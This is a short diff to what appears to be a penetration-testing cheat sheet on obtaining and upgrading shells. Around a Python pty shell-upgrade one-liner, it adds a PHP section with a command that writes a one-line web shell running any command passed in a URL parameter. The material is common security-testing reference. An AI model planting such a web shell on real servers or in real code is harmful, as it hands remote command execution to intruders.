@@ -53,6 +53,11 @@ isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echo
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+#### PHP
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
 #### Using script command
 
 ```bash
